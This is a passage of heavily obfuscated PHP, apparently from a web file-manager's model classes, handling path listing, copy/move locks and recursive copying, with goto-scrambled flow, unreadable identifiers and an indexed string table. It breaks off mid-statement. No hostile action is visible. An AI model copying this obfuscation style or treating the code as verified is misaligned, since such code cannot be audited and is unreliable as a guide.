£ˆÀË¾[8], $bÂ¿” ùºÕ); goto a—‡÷ÍØ¤Ò; AœÚêß—ºë: $fàŸº¢‹ª” = $this->parentLevelArray($A–¿²¨¥‹‚[$C‘ £ˆÀË¾[455]]); $bÂ¿” ùºÕ = $this->_listAppendPathRoot($A–¿²¨¥‹‚, $fàŸº¢‹ª”); foreach ($fàŸº¢‹ª” as $aù›©Ÿ•ÂŠ) { if (isset($d…ˆÎóÆò[$aù›©Ÿ•ÂŠ])) { $bÂ¿” ùºÕ .= $d…ˆÎóÆò[$aù›©Ÿ•ÂŠ] . $C‘ £ˆÀË¾[8]; } } goto BÃÛÌÔ±ˆ; B™ë‘‘†…ã: } goto eù¶î›®šª; aÇ¬šÍ­: $C‘ £ˆÀË¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $d…ˆÎóÆò = array(); foreach ($FÍÜå«íÕ as &$A–¿²¨¥‹‚) { $d…ˆÎóÆò[$A–¿²¨¥‹‚[$C‘ £ˆÀË¾[365]]] = $A–¿²¨¥‹‚[$C‘ £ˆÀË¾[28]]; $fàŸº¢‹ª” = $this->parentLevelArray($A–¿²¨¥‹‚[$C‘ £ˆÀË¾[455]]); array_shift($fàŸº¢‹ª”); foreach ($fàŸº¢‹ª” as $aù›©Ÿ•ÂŠ) { if (!isset($d…ˆÎóÆò[$aù›©Ÿ•ÂŠ])) { $d…ˆÎóÆò[$aù›©Ÿ•ÂŠ] = 0; } } } goto AÙ½È–í¡; eù¶î›®šª: } private function _listAppendPathRecycle(&$c¤àí¦Àœ‘, $fª«»øó ®, $fæ‚ä¢§£ï) { goto B ‰àÎó®Ğ; B ‰àÎó®Ğ: $EŒ™«Ô©Ë =& $_SERVER[Ö¹ñÒÁ²÷]; if (intval($c¤àí¦Àœ‘[$EŒ™«Ô©Ë[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($fæ‚ä¢§£ï, $fª«»øó ®) && $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[365]] != $fæ‚ä¢§£ï) { return; } goto c¥¸¥êÙôÙ; c‚êÉ–Üº®: $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[455]] = $EŒ™«Ô©Ë[466] . implode($EŒ™«Ô©Ë[47], array_slice($fª«»øó ®, 1)) . $EŒ™«Ô©Ë[47]; if ($c¤àí¦Àœ‘[$EŒ™«Ô©Ë[365]] == $fæ‚ä¢§£ï) { $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[455]] = $EŒ™«Ô©Ë[466]; $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[457]] = $EŒ™«Ô©Ë[464]; $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[28]] = LNG($EŒ™«Ô©Ë[465]); } $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[467]] = $EŒ™«Ô©Ë[468]; goto Eßâ‡¡±Å‡; c¥¸¥êÙôÙ: $a†Â´›Öçù = explode($EŒ™«Ô©Ë[8], trim($c¤àí¦Àœ‘[$EŒ™«Ô©Ë[462]], $EŒ™«Ô©Ë[8])); $A‡×÷º÷– = implode($EŒ™«Ô©Ë[8], array_slice($a†Â´›Öçù, 2)); $c¤àí¦Àœ‘[$EŒ™«Ô©Ë[462]] = $EŒ™«Ô©Ë[8] . LNG($EŒ™«Ô©Ë[465]) . $EŒ™«Ô©Ë[8] . ltrim($A‡×÷º÷–, $EŒ™«Ô©Ë[8]); goto c‚êÉ–Üº®; Eßâ‡¡±Å‡: } protected function _listAppendPathRoot(&$C‚Üº²¯Ü, $DàÒºÕ“¡Ë) { $DËÎ¹‹ë =& $_SERVER[Ö¹ñÒÁ²÷]; $E™ãÃ¸§‘ = $DËÎ¹‹ë[33]; if ($C‚Üº²¯Ü[$DËÎ¹‹ë[367]] == self::TYPE_USER) { if (defined($DËÎ¹‹ë[423]) && $C‚Üº²¯Ü[$DËÎ¹‹ë[452]] == USER_ID) { $E™ãÃ¸§‘ = LNG($DËÎ¹‹ë[469]); if (!$DàÒºÕ“¡Ë) { $C‚Üº²¯Ü[$DËÎ¹‹ë[28]] = $E™ãÃ¸§‘; } } else { $C§ôŞ¸«µÖ = Model($DËÎ¹‹ë[470])->getInfoSimple($C‚Üº²¯Ü[$DËÎ¹‹ë[452]]); $E™ãÃ¸§‘ = LNG($DËÎ¹‹ë[471]) . $DËÎ¹‹ë[153] . $C§ôŞ¸«µÖ[$DËÎ¹‹ë[28]] . $DËÎ¹‹ë[472]; } } else { if ($C‚Üº²¯Ü[$DËÎ¹‹ë[367]] == self::TYPE_GROUP) { $C§ôŞ¸«µÖ = Model($DËÎ¹‹ë[454])->getInfoSimple($C‚Üº²¯Ü[$DËÎ¹‹ë[452]]); $E™ãÃ¸§‘ = $C§ôŞ¸«µÖ[$DËÎ¹‹ë[28]]; } else { if ($C‚Üº²¯Ü[$DËÎ¹‹ë[367]] == self::TYPE_SYSTEM) { $C§ôŞ¸«µÖ = $this->sourceInfo($DàÒºÕ“¡Ë[0], !0); $E™ãÃ¸§‘ = $C§ôŞ¸«µÖ[$DËÎ¹‹ë[28]]; } } } $E™ãÃ¸§‘ = $E™ãÃ¸§‘ ? $DËÎ¹‹ë[8] . $E™ãÃ¸§‘ . $DËÎ¹‹ë[8] : $DËÎ¹‹ë[8]; return $E™ãÃ¸§‘; } protected function _listAppendUser(&$cß…´øšÔ‰) { $A±˜–©ß =& $_SERVER[Ö¹ñÒÁ²÷]; $e– ê»£ = array_to_keyvalue($cß…´øšÔ‰, $A±˜–©ß[33], $A±˜–©ß[374]); $cóŠ–·× = array_to_keyvalue($cß…´øšÔ‰, $A±˜–©ß[33], $A±˜–©ß[375]); $D®ÅŒ†¡ÅÁ = array_merge($e– ê»£, $cóŠ–·×); $bàæ–àÑù¨ = Model($A±˜–©ß[473])->userListInfo($D®ÅŒ†¡ÅÁ); foreach ($cß…´øšÔ‰ as &$cŠ‚‹±Ëåæ) { $aöñ›ø†Ÿ¢ = $cŠ‚‹±Ëåæ[$A±˜–©ß[374]]; $cŠ‚‹±Ëåæ[$A±˜–©ß[374]] = $bàæ–àÑù¨[$aöñ›ø†Ÿ¢] ? $bàæ–àÑù¨[$aöñ›ø†Ÿ¢] : !1; $aöñ›ø†Ÿ¢ = $cŠ‚‹±Ëåæ[$A±˜–©ß[375]]; $cŠ‚‹±Ëåæ[$A±˜–©ß[375]] = $bàæ–àÑù¨[$aöñ›ø†Ÿ¢] ? $bàæ–àÑù¨[$aöñ›ø†Ÿ¢] : !1; if (isset($cŠ‚‹±Ëåæ[$A±˜–©ß[413]]) && $cŠ‚‹±Ëåæ[$A±˜–©ß[413]][$A±˜–©ß[474]]) { $A³¦†’äõ = $GLOBALS[$A±˜–©ß[6]][$A±˜–©ß[84]][$A±˜–©ß[475]]; if ($cŠ‚‹±Ëåæ[$A±˜–©ß[413]][$A±˜–©ß[476]] <= time() - $A³¦†’äõ) { $this->metaSet($cŠ‚‹±Ëåæ[$A±˜–©ß[365]], $A±˜–©ß[474], null); $this->metaSet($cŠ‚‹±Ëåæ[$A±˜–©ß[365]], $A±˜–©ß[476], null); unset($cŠ‚‹±Ëåæ[$A±˜–©ß[413]][$A±˜–©ß[474]]); continue; } $Fîê¤Æ¶˜ = $cŠ‚‹±Ëåæ[$A±˜–©ß[413]][$A±˜–©ß[474]]; $cŠ‚‹±Ëåæ[$A±˜–©ß[413]][$A±˜–©ß[477]] = Model($A±˜–©ß[473])->getInfoSimpleOuter($Fîê¤Æ¶˜); } } } public function parentLevelArray($F—°ÊÃŠøŸ) { $e×‘ùê©« =& $_SERVER[Ö¹ñÒÁ²÷]; $F—°ÊÃŠøŸ = explode($e×‘ùê©«[47], trim($F—°ÊÃŠøŸ, $e×‘ùê©«[47])); return array_remove_value($F—°ÊÃŠøŸ, $e×‘ùê©«[464]); } public function listAll($cùÖà¡å›) { goto Eºø°×‰; aÜ‹Î¿›È: $AÛ¦´…Ÿ¼‡ = array_to_keyvalue($AÛ¦´…Ÿ¼‡, $B¦©“••“[365]); $BÛ¯ÃĞÊõÚ = "\57{$eØ”³¿áŸ[$B¦©“••“[28]]}\57"; $BÛ¯ÃĞÊõÚ = $BÛ¯ÃĞÊõÚ == $B¦©“••“[463] ? $B¦©“••“[8] : $BÛ¯ÃĞÊõÚ; goto eËÅùºÎ®Ø; AİäÍËÛ: $BøÜ÷º†“ = $B¦©“••“[482]; $e±îÂâ«Ÿ = "\x4c\105\106\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\x20\146\151\x6c\x65\x20\157\x6e\40\x73\x6f\165\x72\143\145\x2e\146\x69\x6c\145\111\104\x20\75\x20\146\151\x6c\145\x2e\146\151\154\145\111\x44"; $AÛ¦´…Ÿ¼‡ = $this->alias($B¦©“••“[483])->field($BøÜ÷º†“)->where($AêÔ¦î¸)->join($e±îÂâ«Ÿ)->select(); goto cáËªÛì³; cáËªÛì³: $this->_listAppendAuth($AÛ¦´…Ÿ¼‡); $this->_listAppendUser($AÛ¦´…Ÿ¼‡); $this->_listAppendPath($AÛ¦´…Ÿ¼‡); goto aÜ‹Î¿›È; eËÅùºÎ®Ø: $DÍÁ‰çç™ò = array(); foreach ($AÛ¦´…Ÿ¼‡ as $aÄ¤ÀÉ„á => $f÷¦âÕ¯¹é) { goto fİ•Ó÷ñ”¤; aĞ¥¹Áéé: if (!$f÷¦âÕ¯¹é[$B¦©“••“[366]]) { $C²‹ªÄ‡§[$B¦©“••“[415]] = $f÷¦âÕ¯¹é[$B¦©“••“[415]]; $C²‹ªÄ‡§[$B¦©“••“[485]] = $f÷¦âÕ¯¹é[$B¦©“••“[75]]; } $DÍÁ‰çç™ò[] = $C²‹ªÄ‡§; goto C·–ñ¦Ø‚; eÇ±¡êÑ: $eØ”½˜¿ = str_replace($B¦©“••“[463], $B¦©“••“[8], $eØ”½˜¿); $eØ”½˜¿ = str_replace($B¦©“••“[463], $B¦©“••“[8], $eØ”½˜¿); $C²‹ªÄ‡§ = array($B¦©“••“[383] => str_replace($B¦©“••“[463], $B¦©“••“[8], $eØ”½˜¿), $B¦©“••“[484] => intval($f÷¦âÕ¯¹é[$B¦©“••“[366]]), $B¦©“••“[387] => $this->pathInfoFilter($f÷¦âÕ¯¹é, !0)); goto aĞ¥¹Áéé; eÑôæ¨óØ: for ($Cà‡¹í™‰è = 0; $Cà‡¹í™‰è < count($aÓ‹ÇÇ‘÷Ü); $Cà‡¹í™‰è++) { $eØ”½˜¿ .= $AÛ¦´…Ÿ¼‡[$aÓ‹ÇÇ‘÷Ü[$Cà‡¹í™‰è]][$B¦©“••“[28]] . $B¦©“••“[8]; } $eØ”½˜¿ .= $f÷¦âÕ¯¹é[$B¦©“••“[28]]; if ($f÷¦âÕ¯¹é[$B¦©“••“[366]]) { $eØ”½˜¿ .= $B¦©“••“[8]; } goto eÇ±¡êÑ; fİ•Ó÷ñ”¤: $aÓ‹ÇÇ‘÷Ü = $this->parentLevelArray($f÷¦âÕ¯¹é[$B¦©“••“[455]]); array_shift($aÓ‹ÇÇ‘÷Ü); $eØ”½˜¿ = $BÛ¯ÃĞÊõÚ; goto eÑôæ¨óØ; C·–ñ¦Ø‚: } return $DÍÁ‰çç™ò; goto f”ÀŞ–Üõ; Eºø°×‰: $B¦©“••“ =& $_SERVER[Ö¹ñÒÁ²÷]; $eØ”³¿áŸ = $this->sourceInfo($cùÖà¡å›); $AêÔ¦î¸ = array($B¦©“••“[478] => array($B¦©“••“[479], $eØ”³¿áŸ[$B¦©“••“[455]] . $cùÖà¡å› . $B¦©“••“[480]), $B¦©“••“[481] => 0); goto AİäÍËÛ; f”ÀŞ–Üõ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($e¾ĞÂÙ×å) { goto b‡„¼˜¶»Ä; fˆ‡Ü¨­›: $this->_lockEvent($e¾ĞÂÙ×å, array($f“áÎáÏ§´[489], $f“áÎáÏ§´[490]), $a›²Š¿‘); $this->_lockCheckEnd($f“áÎáÏ§´[486], $e¾ĞÂÙ×å); goto D‹‘‹¸¯®; b‡„¼˜¶»Ä: $f“áÎáÏ§´ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($f“áÎáÏ§´[486], $e¾ĞÂÙ×å); goto EãÔ«Æé‹¶; EãÔ«Æé‹¶: $a›²Š¿‘ = 1; $this->_lockEvent($e¾ĞÂÙ×å, array($f“áÎáÏ§´[487], $f“áÎáÏ§´[488]), $a›²Š¿‘); $this->_lockParent($e¾ĞÂÙ×å, array($f“áÎáÏ§´[488]), $a›²Š¿‘); goto fˆ‡Ü¨­›; D‹‘‹¸¯®: } public function lockCopyEnd($Eá­ ¬ƒóâ) { $Cå»°¸³¥ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $f …Š‡Ñ¼Ÿ = 0; $this->_lockEvent($Eá­ ¬ƒóâ, array($Cå»°¸³¥[487], $Cå»°¸³¥[488]), $f …Š‡Ñ¼Ÿ); $this->_lockParent($Eá­ ¬ƒóâ, array($Cå»°¸³¥[488]), $f …Š‡Ñ¼Ÿ); $this->_lockEvent($Eá­ ¬ƒóâ, array($Cå»°¸³¥[489], $Cå»°¸³¥[490]), $f …Š‡Ñ¼Ÿ); } public function lockWriteStart($Bõæ¤»†™Â, $CöÂøª‘“ = '') { goto cˆ®Îé´î; FÎ¹âœæÁ: $B¬í¥¿ = 1; $this->_lockKey($e¬àÜ†Ñ›[491] . $Bõæ¤»†™Â . $e¬àÜ†Ñ›[91] . $CöÂøª‘“, $B¬í¥¿); $this->_lockEvent($Bõæ¤»†™Â, array($e¬àÜ†Ñ›[486], $e¬àÜ†Ñ›[488]), $B¬í¥¿); goto e´»»—¶¼Ë; e´»»—¶¼Ë: $this->_lockParent($Bõæ¤»†™Â, array($e¬àÜ†Ñ›[486], $e¬àÜ†Ñ›[488]), $B¬í¥¿); $this->_lockCheckEnd($e¬àÜ†Ñ›[487], $Bõæ¤»†™Â); goto d×ğ¡ø¡÷; cˆ®Îé´î: $e¬àÜ†Ñ› =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($e¬àÜ†Ñ›[487], $Bõæ¤»†™Â); goto FÎ¹âœæÁ; d×ğ¡ø¡÷: } public function lockWriteEnd($EÚÚ‡îƒšÖ, $fâŸ³¿¢¢ = '') { $C”ó‹‘É±‘ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $FÒİİö³Æè = 0; $this->_lockKey($C”ó‹‘É±‘[491] . $EÚÚ‡îƒšÖ . $C”ó‹‘É±‘[91] . $fâŸ³¿¢¢, $FÒİİö³Æè); $this->_lockEvent($EÚÚ‡îƒšÖ, array($C”ó‹‘É±‘[486], $C”ó‹‘É±‘[488]), $FÒİİö³Æè); $this->_lockParent($EÚÚ‡îƒšÖ, array($C”ó‹‘É±‘[486], $C”ó‹‘É±‘[488]), $FÒİİö³Æè); } public function lockMoveStart($eÃï¿÷£…„) { goto F—äé—¢ğ“; F—äé—¢ğ“: $f…çÒç­£à =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($f…çÒç­£à[488], $eÃï¿÷£…„); goto Aõİµâôøù; Aõİµâôøù: $F„˜Ğ©ê° = 1; $this->_lockKey($f…çÒç­£à[492] . $eÃï¿÷£…„, $F„˜Ğ©ê°); $this->_lockEvent($eÃï¿÷£…„, array($f…çÒç­£à[486], $f…çÒç­£à[487]), $F„˜Ğ©ê°); goto fª· Ò‘°§; fª· Ò‘°§: $this->_lockParent($eÃï¿÷£…„, array($f…çÒç­£à[486], $f…çÒç­£à[488]), $F„˜Ğ©ê°); $this->_lockEvent($eÃï¿÷£…„, array($f…çÒç­£à[493], $f…çÒç­£à[489], $f…çÒç­£à[490]), $F„˜Ğ©ê°); $this->_lockCheckEnd($f…çÒç­£à[488], $eÃï¿÷£…„); goto AÙê‹—ëêó; AÙê‹—ëêó: } public function lockMoveEnd($Bœí•¹ô¯) { goto A‰§¼šİ¦; cî´‡ÌÊ¼: $this->_lockKey($DĞ’áòô¡§[492] . $Bœí•¹ô¯, $A…—™·§÷ ); $this->_lockEvent($Bœí•¹ô¯, array($DĞ’áòô¡§[486], $DĞ’áòô¡§[487]), $A…—™·§÷ ); $this->_lockParent($Bœí•¹ô¯, array($DĞ’áòô¡§[486], $DĞ’áòô¡§[488]), $A…—™·§÷ ); goto d­µ‚°¬’; d­µ‚°¬’: $this->_lockEvent($Bœí•¹ô¯, array($DĞ’áòô¡§[493], $DĞ’áòô¡§[489], $DĞ’áòô¡§[490]), $A…—™·§÷ ); goto e»½òÔ—Û; A‰§¼šİ¦: $DĞ’áòô¡§ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->allowLock()) { return; } $A…—™·§÷  = 0; goto cî´‡ÌÊ¼; e»½òÔ—Û: } private function _lockCheck($c‡’™ˆ½™ï, $DŒÚ‡¶ãø) { goto c„§‚”ÎëÅ; e¦‡ê™ô‡ø: $this->_lockTimeStart[$A­Ü¶ğÆ†ç] = timeFloat(); if (!is_array($bÏØ‰‰ö¦Ø)) { return; } $BÚÂƒ·÷Å = LNG($c¤é‡¶èî˜[494]); goto a¨êçØÏªï; c„§‚”ÎëÅ: $c¤é‡¶èî˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÏØ‰‰ö¦Ø = $this->sourceInfo($DŒÚ‡¶ãø); $A­Ü¶ğÆ†ç = $c‡’™ˆ½™ï . $c¤é‡¶èî˜[91] . $DŒÚ‡¶ãø; goto e¦‡ê™ô‡ø; a¨êçØÏªï: CacheLock::setErrorMsg($c¤é‡¶èî˜[153] . htmlspecialchars($bÏØ‰‰ö¦Ø[$c¤é‡¶èî˜[28]]) . $c¤é‡¶èî˜[472] . $BÚÂƒ·÷Å); $this->_lockKey($A­Ü¶ğÆ†ç, 1); $this->_lockKey($A­Ü¶ğÆ†ç, 0); goto cŸ®öãÔØ; cŸ®öãÔØ: $A‚Ù¦»î›® = array_reverse($this->parentLevelArray($bÏØ‰‰ö¦Ø[$c¤é‡¶èî˜[455]])); foreach ($A‚Ù¦»î›® as $fÀÜŒ¥Æ) { $A­Ü¶ğÆ†ç = $c‡’™ˆ½™ï . $c¤é‡¶èî˜[495] . $fÀÜŒ¥Æ; if (CacheLock::lockGet($c¤é‡¶èî˜[496] . $A­Ü¶ğÆ†ç)) { $bÏØ‰‰ö¦Ø = $this->sourceInfo($fÀÜŒ¥Æ); CacheLock::setErrorMsg($c¤é‡¶èî˜[153] . htmlspecialchars($bÏØ‰‰ö¦Ø[$c¤é‡¶èî˜[28]]) . $c¤é‡¶èî˜[472] . $BÚÂƒ·÷Å); $this->_lockKey($A­Ü¶ğÆ†ç, 1); $this->_lockKey($A­Ü¶ğÆ†ç, 0); } } goto B¡„äƒÌ»‘; B¡„äƒÌ»‘: } private function _lockCheckEnd($A´œŒÅ£, $Dâ¹Ñ¡¶©) { goto D‚‹Ô‹îì; EïÑöá®Íå: if (!isset($this->_lockTimeStart[$a°Œ©¯‘ö])) { return; } $CÓÈ‡ç™Ó = timeFloat() - $this->_lockTimeStart[$a°Œ©¯‘ö]; unset($this->_lockTimeStart[$a°Œ©¯‘ö]); goto Bùš‰²ŸŒØ; Bùš‰²ŸŒØ: if ($CÓÈ‡ç™Ó > 0.5) { unset(self::$cacheSourceInfo[$aõ¯–Â·ö[406] . $Dâ¹Ñ¡¶©]); } $F–Ç³¸ããÎ = $this->sourceInfo($Dâ¹Ñ¡¶©); if (!$F–Ç³¸ããÎ) { show_json(LNG($aõ¯–Â·ö[100]), !1); } goto e´ĞÆ–åğ; D‚‹Ô‹îì: $aõ¯–Â·ö =& $_SERVER[Ö¹ñÒÁ²÷]; $a°Œ©¯‘ö = $A´œŒÅ£ . $aõ¯–Â·ö[91] . $Dâ¹Ñ¡¶©; CacheLock::setErrorMsg($aõ¯–Â·ö[357]); goto EïÑöá®Íå; e´ĞÆ–åğ: } private function _lockParent($cæí¾¿ª¼ç, $BÍËÙŞÁÔ«, $BÂ©¯¨‹Ä‡) { if (!$this->autoLockSet) { return; } $FÆíµÚà = $this->sourceInfo($cæí¾¿ª¼ç); if (!is_array($FÆíµÚà)) { return; } $c±åÍŒİö = array_reverse($this->parentLevelArray($FÆíµÚà[$_SERVER[Ö¹ñÒÁ²÷][455]])); foreach ($c±åÍŒİö as $a‚„ƒ¾Êˆ») { $this->_lockEvent($a‚„ƒ¾Êˆ», $BÍËÙŞÁÔ«, $BÂ©¯¨‹Ä‡); } } private function _lockEvent($E¿£ëÈ«¦, $d›¡…¬ï, $bˆøÖôÉˆë) { $c¬ªÀ±ë ‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->autoLockSet) { return; } foreach ($d›¡…¬ï as $c“†³š¶Íˆ) { $AßŸ§éô = $c“†³š¶Íˆ . $c¬ªÀ±ë ‰[91] . $E¿£ëÈ«¦; if ($bˆøÖôÉˆë && CacheLock::lockGet($c¬ªÀ±ë ‰[496] . $AßŸ§éô)) { continue; } $this->_lockKey($AßŸ§éô, $bˆøÖôÉˆë); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F†—â¥‰ïƒ, $C¢›êÍì²” = 1) { $cäëé¶ÜÁÂ = $_SERVER[Ö¹ñÒÁ²÷][496] . md5($F†—â¥‰ïƒ); if ($C¢›êÍì²”) { if (isset(self::$_lockItemArr[$cäëé¶ÜÁÂ])) { return; } self::$_lockItemArr[$cäëé¶ÜÁÂ] = 1; CacheLock::lock($cäëé¶ÜÁÂ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$cäëé¶ÜÁÂ])) { return; } unset(self::$_lockItemArr[$cäëé¶ÜÁÂ]); CacheLock::unlock($cäëé¶ÜÁÂ); } } public function isParentOf($CŒ—†®ŒÒÈ, $BØƒŞ”ÚÖ) { goto AŒ˜ø¤†ª; E³‡¬Ó‘: return $FÉ©ğ‘´¸Õ; goto b‡÷»»‡³ğ; AŒ˜ø¤†ª: $d´àø½Ë‡í =& $_SERVER[Ö¹ñÒÁ²÷]; $AÈÎ»Éï†Ù = $this->sourceInfo($CŒ—†®ŒÒÈ); $f£È‘É’º = $this->sourceInfo($BØƒŞ”ÚÖ); goto c‚”Çãè; c‚”Çãè: $fˆ¥Å—àÈ´ = $AÈÎ»Éï†Ù[$d´àø½Ë‡í[455]] . $AÈÎ»Éï†Ù[$d´àø½Ë‡í[365]] . $d´àø½Ë‡í[47]; $D–”æŞæ‘ğ = $f£È‘É’º[$d´àø½Ë‡í[455]] . $f£È‘É’º[$d´àø½Ë‡í[365]] . $d´àø½Ë‡í[47]; $FÉ©ğ‘´¸Õ = strpos($D–”æŞæ‘ğ, $fˆ¥Å—àÈ´) === 0; goto E³‡¬Ó‘; b‡÷»»‡³ğ: } private $targetIsDelete = 0; public function copy($d§ÕµƒåŸ¸, $Bê—Ûİ ±·, $dïÚÙ°‹° = REPEAT_REPLACE, $eíò¬ïì½ = '') { goto eİìº›Ï«‹; BÜìÕÕ¦‚Î: $this->saveAll($cÇÃ£ÑæÔ [$eÄ•ÔÎíãå[499]]); Model($eÄ•ÔÎíãå[163])->linkAdd($cÇÃ£ÑæÔ [$eÄ•ÔÎíãå[497]]); $this->folderSizeReset($Bê—Ûİ ±·); goto F˜Öƒ¤çœğ; cø¨ñ¤ˆÅ×: $this->lockCopyStart($d§ÕµƒåŸ¸); $this->lockWriteStart($Bê—Ûİ ±·, $F†èµ½«‰); $cÇÃ£ÑæÔ  = array($eÄ•ÔÎíãå[497] => array(), $eÄ•ÔÎíãå[498] => array(), $eÄ•ÔÎíãå[499] => array()); goto BÉ”’Ûø®æ; F˜Öƒ¤çœğ: $this->updateModifyTime($Bê—Ûİ ±·); return $EŸ„Š÷‹¤Õ; goto cç¬‹Ûší; BÉ”’Ûø®æ: $this->targetIsDelete = intval($Aˆ½ŸœòŞ[$eÄ•ÔÎíãå[393]]); $CÈ¯ñ§§â” = $this->fileNameExistCache($Bê—Ûİ ±·, $Aˆ½ŸœòŞ[$eÄ•ÔÎíãå[28]]); $EŸ„Š÷‹¤Õ = $this->_copy($d§ÕµƒåŸ¸, $Bê—Ûİ ±·, $dïÚÙ°‹°, $cÇÃ£ÑæÔ , !0, $eíò¬ïì½); goto dè‘¸±Ê£–; CæÈŸğ ”Ò: if (!$Aˆ½ŸœòŞ || !$e»£ ±í’  || $e»£ ±í’ [$eÄ•ÔÎíãå[366]] != $eÄ•ÔÎíãå[83]) { return !1; } if ($this->isParentOf($d§ÕµƒåŸ¸, $Bê—Ûİ ±·)) { return !1; } $F†èµ½«‰ = $eíò¬ïì½ ? $eíò¬ïì½ : $Aˆ½ŸœòŞ[$eÄ•ÔÎíãå[28]]; goto cø¨ñ¤ˆÅ×; dè‘¸±Ê£–: $this->_childrenListClear(); $this->lockCopyEnd($d§ÕµƒåŸ¸); $this->lockWriteEnd($Bê—Ûİ ±·, $F†èµ½«‰); goto Bæä‹ùõÖ; Bæä‹ùõÖ: if ($Aˆ½ŸœòŞ[$eÄ•ÔÎíãå[366]] == $eÄ•ÔÎíãå[83] && $CÈ¯ñ§§â” == $EŸ„Š÷‹¤Õ) { $this->folderSizeResetChildren($CÈ¯ñ§§â”); } Model($eÄ•ÔÎíãå[500])->addAll($cÇÃ£ÑæÔ [$eÄ•ÔÎíãå[498]], array(), !0); if ($CÈ¯ñ§§â” != $EŸ„Š÷‹¤Õ || $Aˆ½ŸœòŞ[$eÄ•ÔÎíãå[366]] == $eÄ•ÔÎíãå[83]) { Model($eÄ•ÔÎíãå[501])->eventCopy($EŸ„Š÷‹¤Õ); } goto BÜìÕÕ¦‚Î; eİìº›Ï«‹: $eÄ•ÔÎíãå =& $_SERVER[Ö¹ñÒÁ²÷]; $Aˆ½ŸœòŞ = $this->sourceInfo($d§ÕµƒåŸ¸); $e»£ ±í’  = $this->sourceInfo($Bê—Ûİ ±·); goto CæÈŸğ ”Ò; cç¬‹Ûší: } private function _copy($d«ç’…¬µ¨, $AŒÇåÃ¶÷, $c‹‚¤¢Íâê, &$EÍ‘«Ãªò¼, $EôÛ†âÛ£È, $A£ºÌêÍ‡ = '') { goto AÈâ¸õ½; A‚éº¤Ä: $dóÂ¤ÙšÔÓ = $A£ºÌêÍ‡ ? $A£ºÌêÍ‡ : $CÀ¬£Ê¦ëË[$CË”óëÆ‚™[28]]; $dìã›¶ë = $this->fileNameExistCache($AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ); if ($EôÛ†âÛ£È) { $this->_childrenAllMake($d«ç’…¬µ¨); if ($Cí±Ö¡õ && $dìã›¶ë) { $this->_childrenAllMake($dìã›¶ë); } } goto e±óºÀ‹; AÈâ¸õ½: $CË”óëÆ‚™ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÀ¬£Ê¦ëË = $this->sourceInfoCache($d«ç’…¬µ¨); $Cí±Ö¡õ = $CÀ¬£Ê¦ëË[$CË”óëÆ‚™[366]] == $CË”óëÆ‚™[83]; goto A‚éº¤Ä; e“¬™¾ È: return $dÔ‘çóî¿¬; goto b¯ÖÅî«ó; e±óºÀ‹: if (!$dìã›¶ë) { return $this->_copyCreate($d«ç’…¬µ¨, $AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ, $EÍ‘«Ãªò¼); } $dÔ‘çóî¿¬ = $dìã›¶ë; if ($Cí±Ö¡õ) { if ($c‹‚¤¢Íâê == REPEAT_RENAME_FOLDER) { $dóÂ¤ÙšÔÓ = $this->fileNameAutoCache($AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ, $c‹‚¤¢Íâê, $Cí±Ö¡õ); $dÔ‘çóî¿¬ = $this->_copyCreate($d«ç’…¬µ¨, $AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ, $EÍ‘«Ãªò¼); } else { $Eè‹‘‡ƒ± = $this->_childrenList($d«ç’…¬µ¨); foreach ($Eè‹‘‡ƒ± as $a‰Ç  Ğ‰¦) { $this->_copy($a‰Ç  Ğ‰¦[$CË”óëÆ‚™[365]], $dìã›¶ë, $c‹‚¤¢Íâê, $EÍ‘«Ãªò¼, !1); } } } else { if ($c‹‚¤¢Íâê == REPEAT_RENAME || $c‹‚¤¢Íâê == REPEAT_RENAME_FOLDER) { $dóÂ¤ÙšÔÓ = $this->fileNameAutoCache($AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ, $c‹‚¤¢Íâê, $Cí±Ö¡õ); $dÔ‘çóî¿¬ = $this->_copyCreate($d«ç’…¬µ¨, $AŒÇåÃ¶÷, $dóÂ¤ÙšÔÓ, $EÍ‘«Ãªò¼); } else { if ($c‹‚¤¢Íâê == REPEAT_REPLACE) { $eË¥¹õ¹œ = $this->sourceInfoCache($dìã›¶ë); $E±„ìéÜ = $this->fileHistory($eË¥¹õ¹œ, $CÀ¬£Ê¦ëË[$CË”óëÆ‚™[415]], $CÀ¬£Ê¦ëË[$CË”óëÆ‚™[77]]); if ($E±„ìéÜ) { $EÍ‘«Ãªò¼[$CË”óëÆ‚™[497]][] = $CÀ¬£Ê¦ëË[$CË”óëÆ‚™[415]]; } } else { if ($c‹‚¤¢Íâê == REPEAT_SKIP) { } } } Hook::trigger($CË”óëÆ‚™[502], array($CË”óëÆ‚™[503], $CÀ¬£Ê¦ëË, 0)); } goto e“¬™¾ È; b¯ÖÅî«ó: } private function _copyCreate($f³îõïÆ, $C¸È“¶öÒĞ, $B¾¤‹ÂßëÜ, &$c†ÈÑ‘šò) { goto f”‹ù²±¨; f”‹ù²±¨: $CÜÆ§ãÏµ =& 